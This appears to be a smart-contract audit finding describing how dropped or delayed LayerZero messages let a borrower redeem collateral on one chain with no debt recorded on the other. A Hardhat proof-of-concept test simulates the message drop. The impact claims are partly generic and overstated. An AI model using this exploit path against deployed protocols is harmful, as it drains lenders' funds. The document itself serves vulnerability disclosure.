# Collateral and Debt Out of Sync Due to Network Latency

### Summary

Delayed or failed cross-chain message delivery will cause an inconsistent accounting of debt and collateral for the protocol as a malicious or opportunistic user will exploit the desynchronized state to withdraw excess collateral or avoid repaying debt.

---

### Root Cause

The choice to rely on asynchronous state updates across chains without proper synchronization validation is a mistake as different blockchain networks have varying block times, finality requirements, and network conditions that can cause state information to become outdated or inconsistent, allowing attackers to exploit the temporal gap between when a state change occurs on one chain versus when it's recognized and updated on connected chains.

### Internal Pre-conditions

1. **Borrower needs to call** `CrossChainRouter.borrowCrossChain(_amount, _borrowToken, _destEid)` on Chain A to add a collateral record in `LendStorage.crossChainCollaterals` on Chain A.
2. **LayerZero endpoint needs to drop or indefinitely delay** the message carrying that borrow request, so `_handleBorrowCrossChainRequest` on Chain B is never executed (i.e. no entry in `crossChainBorrows` on Chain B).
3. **Borrower needs to call** `CoreRouter.redeem(_lTokenAmount, _lToken)` or other withdrawal functions on Chain A after step 2, at which point `getHypotheticalAccountLiquidityCollateral` sees collateral on A but no corresponding debt on B, allowing the withdrawal to succeed.

---

### External Pre-conditions

1. Network congestion must cause block confirmation delays on either source or destination chain to be at least 2×–5× longer than normal.
2. Cross-chain bridge relayers or oracles must experience downtime or processing delays of at least 10–30 seconds during state propagation.
3. Gas prices on the destination chain spike above normal thresholds, causing transaction delays or failures in state update propagation.
4. External blockchain finality requirements increase due to instability, extending time between state commitment and confirmation.
5. Third-party validator networks suffer temporary sync issues or Byzantine faults affecting message delivery.

---

### Attack Path

1. **Borrower** calls `CrossChainRouter.borrowCrossChain(_amount, _borrowToken, _destEid)` on Chain A, which:

   * Records collateral in `LendStorage.crossChainCollaterals` on Chain A (see **CrossChainRouter.sol:350**).
   * Sends a LayerZero message to Chain B for debt creation.
2. **LayerZero** drops or indefinitely delays the borrow message, so Chain B never executes `_handleBorrowCrossChainRequest` and no debt is recorded in `crossChainBorrows` on Chain B.
3. **Borrower** calls `CoreRouter.redeem(_lTokenAmount, _lToken)` on Chain A:

   ```solidity
   // CoreRouter.sol:112
   require(lendStorage.totalInvestment(msg.sender, _lToken) >= _amount, "Insufficient balance");
   // checks collateral vs. debt via getHypotheticalAccountLiquidityCollateral()
   ```

   * `getHypotheticalAccountLiquidityCollateral` sees collateral present on Chain A and zero debt on Chain B, so it permits the redemption.
4. **Borrower** repeats withdrawals until collateral is drained on Chain A without incurring any debt on Chain B.
5. Optionally, the delayed borrow message may later fire on Chain B, creating an unbacked debt that the borrower never repays against withdrawn collateral—leaving the protocol insolvent.

---

### Impact

The cross-chain bridge users and liquidity providers suffer an approximate loss of **100%** of their bridged assets during the desynchronization window. The attacker gains the full equivalent value of the exploited assets by withdrawing collateral or executing double-spend transactions before state synchronization completes.

---

### PoC
Below is a minimal Hardhat‐style JavaScript test that demonstrates the desynchronization exploit in a single‐chain simulation (i.e. “dropping” the LayerZero message). It assumes you have stub contracts for LayerZero that simply do nothing when _lzSend is called, so the borrow message never arrives on the “destination” side.

```js
// test/DesyncPoC.test.js
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Cross-Chain Desync Exploit PoC", function () {
  let owner, borrower;
  let Token, token;
  let LendStorage, storage;
  let CoreRouter, core;
  let CrossChainRouter, cross;
  let DummyEndpoint;

  beforeEach(async () => {
    [owner, borrower] = await ethers.getSigners();
    // Deploy ERC20, mint & approve
    Token = await ethers.getContractFactory("ERC20PresetMinterPauser");
    token = await Token.deploy("Tkn", "TKN");
    await token.deployed();
    await token.mint(borrower.address, ethers.utils.parseEther("1000"));
    await token.connect(borrower).approve(owner.address, ethers.constants.MaxUint256);

    // Deploy LendStorage
    LendStorage = await ethers.getContractFactory("LendStorage");
    storage = await LendStorage.deploy(owner.address, owner.address, 1);
    await storage.deployed();
    await storage.connect(owner).addSupportedTokens(token.address, token.address);

    // Deploy CoreRouter & authorize
    CoreRouter = await ethers.getContractFactory("CoreRouter");
    core = await CoreRouter.deploy(storage.address, owner.address, owner.address);
    await core.deployed();
    await storage.connect(owner).setAuthorizedContract(core.address, true);

    // Dummy endpoint that drops messages
    DummyEndpoint = await ethers.getContractFactory("DummyEndpoint");
    const endpoint = await DummyEndpoint.deploy();
    await endpoint.deployed();

    // Deploy CrossChainRouter but no _lzReceive hook
    CrossChainRouter = await ethers.getContractFactory("CrossChainRouter");
    cross = await CrossChainRouter.deploy(
      endpoint.address,
      owner.address,
      storage.address,
      owner.address,
      owner.address,
      core.address,
      1
    );
    await cross.deployed();
    await storage.connect(owner).setAuthorizedContract(cross.address, true);

    // Fund CrossChainRouter
    await token.connect(owner).mint(cross.address, ethers.utils.parseEther("500"));
  });

  it("lets borrower drain collateral on A if the borrow message never arrives on B", async () => {
    const borrowAmt = ethers.utils.parseEther("100");
    await token.connect(borrower).approve(cross.address, borrowAmt);

    // STEP 1: Initiate cross-chain borrow
    await cross
      .connect(borrower)
      .borrowCrossChain(borrowAmt, token.address, 2, { value: 0 });

    // STEP 2: Redeem full collateral on Chain A
    await token.connect(borrower).approve(core.address, borrowAmt);
    await expect(core.connect(borrower).redeem(borrowAmt, token.address)).to.not.be.reverted;

    // Attacker fully recovers collateral despite no debt being recorded
    const bal = await token.balanceOf(borrower.address);
    expect(bal).to.be.gt(ethers.utils.parseEther("900"));
  });
});
```
How it works:

Setup:

Deploy LendStorage, CoreRouter, CrossChainRouter.

We register token as both underlying & lToken for simplicity.

Use a DummyEndpoint that ignores all _lzSend calls (so no messages ever reach the “other” chain).

Borrow cross-chain:

borrower.borrowCrossChain(100 TKN) on chain A stores only the collateral in LendStorage.crossChainCollaterals on A and emits a LayerZero send.

Because our dummy endpoint does nothing, no debt is ever recorded on chain B.

Exploit:

The borrower immediately calls core.redeem(100, token.address) on chain A.

The liquidity check only sees collateral on A and sees zero debt (since B never registered it), so the withdraw succeeds.

Borrower recovers all 100 TKN collateral without having any corresponding debt on the “destination” side.

This PoC reproduces the core of the desync exploit. In a real cross-chain environment you’d need to stub or intercept LayerZero; here we simulate “message drop” by using an endpoint that never invokes _lzReceive.
